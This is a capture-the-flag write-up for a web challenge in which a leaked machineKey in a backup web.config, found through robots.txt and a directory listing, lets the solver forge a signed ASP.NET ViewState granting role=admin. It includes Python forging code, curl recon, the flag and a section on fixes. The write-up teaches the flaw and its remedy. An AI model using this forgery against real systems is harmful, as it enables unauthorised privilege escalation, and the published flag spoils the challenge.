# Contoso Asset Portal

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 100 |
| Author | denny |
| Connection | `http://chal.thjcc.org:31241/` |
| Recovered files | [`artifacts/2024-legacy-web.config~`](artifacts/2024-legacy-web.config~), [`artifacts/assets.csv.bak`](artifacts/assets.csv.bak) |
| Interactive writeup | [Forged ViewState — live forge console](https://claude.ai/code/artifact/707be24b-c285-4177-b6e1-8dbd6ed7d207) |
| Flag | `THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}` |

> A legacy internal asset-lookup tool.

## TL;DR

A mock "legacy ASP.NET 2.0" app puts the caller's **role** and **asset id** in an
ASP.NET `__VIEWSTATE`, protected by an HMAC-SHA1 MAC — so you can't just flip
`guest`→`admin`. But `robots.txt` points at a listable `/backup/` directory that
leaks the **`machineKey` `validationKey`** (an old, un-rotated backup) plus a CSV
naming a **`restricted`** asset. With the key you can **forge a valid signed
ViewState** carrying `role=admin` and the restricted asset id, POST it, and the
portal hands over the confidential record — the flag.

## 1. Recon

The landing page is a search form that HTML-comments its own stack and ships an
ASP.NET ViewState:

```html
<!-- legacy ASP.NET 2.0 migration -->
<form method='post' action='/Default.aspx'>
  <input type='hidden' name='__VIEWSTATE'
         value='/wEMAQVndWVzdAELQVNULTAwMDAwMDBQfx4K0++04ChDSFo9xbXAJ2UUJg==' />
  <input type='text' name='q' placeholder='e.g. AST-00421' />
</form>
```

`Server: Mono-HTTPAPI/1.0`, "Powered by ASP.NET 2.0 © 2009". Submitting a search
echoes the session state back:

```
Signed in as role=guest, asset=AST-0000000.
Confidential records require role=admin.
```

So the goal is to become `role=admin` — and that role lives inside the
ViewState.

## 2. Decoding the ViewState

Base64-decoding `__VIEWSTATE` gives a classic ASP.NET `LOSFormatter` object
graph followed by a 20-byte trailer:

```
ff 01 0c                         header
01 05 "guest"                    string(len=5)  -> role
01 0b "AST-0000000"              string(len=11) -> asset id
50 7f 1e 0a d3 ef b4 e0 28 43    ┐
48 5a 3d c5 b5 c0 27 65 14 26    ┘ 20 bytes = HMAC-SHA1 MAC
```

- `\xff\x01` — LOSFormatter version marker.
- `\x0c` — container token; then two length-prefixed string nodes
  (`\x01 <len> <bytes>`): the **role** and the **asset id**.
- The final **20 bytes** are the ViewState MAC (`EnableViewStateMac`), an
  HMAC-**SHA1** digest (SHA1 = 20 bytes).

Tampering naively — swapping the 5-byte `guest` for the 5-byte `admin` and
re-sending with the *old* MAC — is rejected:

```
HTTP 500 — The state information is invalid for this page and might be corrupted.
           Validation of viewstate MAC failed.
```

So the MAC is enforced. To forge, we need the signing key.

## 3. Finding the Key: `robots.txt` → `/backup/`

```
$ curl -s http://chal.thjcc.org:31241/robots.txt
User-agent: *
Disallow: /backup/
```

`/backup/` has directory listing enabled:

```
Index of /backup
  2024-legacy-web.config~   612
  assets.csv.bak            284
```

The editor-backup `web.config` (`~` suffix) is the whole game — it even
documents its own sin:

```xml
<!-- BACKUP before the migration. TODO: delete before go-live (not done).
     NOTE: keys were NOT rotated, so this old backup still leaks the
     CURRENT production validationKey. -->
<machineKey
  validationKey="F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796A5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4C3D2E1F0A9B8"
  decryptionKey="8C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B"
  validation="SHA1" decryption="AES" />
```

`assets.csv.bak` tells us *which* record is worth reading — the one classified
`restricted`:

```csv
asset_id,name,owner,classification
...
AST-4F2A9C0,Domain Controller,it-admin,restricted
...
```

## 4. Recovering the Exact MAC Recipe

Before forging, confirm precisely how the MAC is computed by reproducing the
**original** `guest` MAC. The winning recipe is the straightforward one —
HMAC-SHA1 keyed by the **hex-decoded** validationKey over the object-graph
bytes:

```python
data = raw[:-20]                       # everything before the 20-byte trailer
key  = bytes.fromhex(validationKey)    # hex string -> raw key bytes
hmac.new(key, data, hashlib.sha1).digest() == raw[-20:]   # -> True  ✓
```

It matches byte-for-byte (`507f1e0a…27651426`), so we know how to sign anything.

## 5. Forging an Admin ViewState

Rebuild the object graph with `role=admin` and the restricted asset id, then
sign. Conveniently `admin` (5) is the same length as `guest`, and
`AST-4F2A9C0` (11) is the same length as `AST-0000000`, but we rebuild from
scratch so lengths don't matter:

```python
def s(x):  return b"\x01" + bytes([len(x)]) + x        # string node
data = b"\xff\x01\x0c" + s(b"admin") + s(b"AST-4F2A9C0")
mac  = hmac.new(bytes.fromhex(validationKey), data, hashlib.sha1).digest()
viewstate = base64.b64encode(data + mac).decode()
```

POST it to `/Default.aspx`:

```
Access granted — role=admin.
Confidential asset AST-4F2A9C0: THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}
```

Note **both** fields are checked. `role=admin` with the *default* asset returns
*"Role admin OK, but asset AST-0000000 is not a confidential record"* — you must
also set the asset to the `restricted` id learned from the CSV. (The visible
`q` text box is a decoy; the asset that gets authorized comes from the signed
ViewState.)

## 6. Automated Solver

[`solve.py`](solve.py) does the whole chain with only the standard library —
reads `robots.txt`, walks `/backup/`, extracts the key and the restricted id,
verifies the MAC recipe against the live guest ViewState, forges the admin
ViewState, and prints the flag:

```bash
python3 solve.py                       # defaults to the challenge URL
```

```
[+] robots.txt discloses /backup/
[+] leaked validationKey (124 hex chars), validation=SHA1
[+] restricted asset id from CSV: AST-4F2A9C0
[+] MAC recipe confirmed: HMAC-SHA1(hex(validationKey), data)
[+] flag: THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}
```

## Why It Works

- **The MAC only protects integrity, not secrecy of the key.** ViewState MAC
  stops tampering *as long as the `validationKey` stays secret*. Once the key
  leaks, an attacker can mint arbitrarily-signed ViewStates — this is the same
  class of bug as the real-world `machineKey` disclosures that lead to ViewState
  deserialization RCE (here it's a benign role swap, but the primitive is
  identical).
- **Backups are source.** An editor swap-file (`web.config~`) served as static
  text hands over secrets that the running app never exposes. `robots.txt`
  `Disallow` entries are a map to exactly those forgotten corners.
- **Trust boundaries don't move with the data.** The role travelled inside a
  client-held token; the server trusted it purely on the MAC. Secret leaked →
  trust broken.

## The Fix

- **Rotate keys after any exposure**, and never keep old keys "just in case" —
  the comment admits the whole failure. Keys in a backup are live keys.
- **Don't serve `/backup/`** (or any editor swap files / directory listings)
  from the web root; keep secrets out of web-served paths entirely.
- **Don't put authorization state in the ViewState.** Derive role
  server-side from an authenticated session; the ViewState should never be the
  source of truth for privilege.

## Flag

```text
THJCC{f0rg3d_v13wst4t3_w1th_l34k3d_m4ch1n3k3y}
```
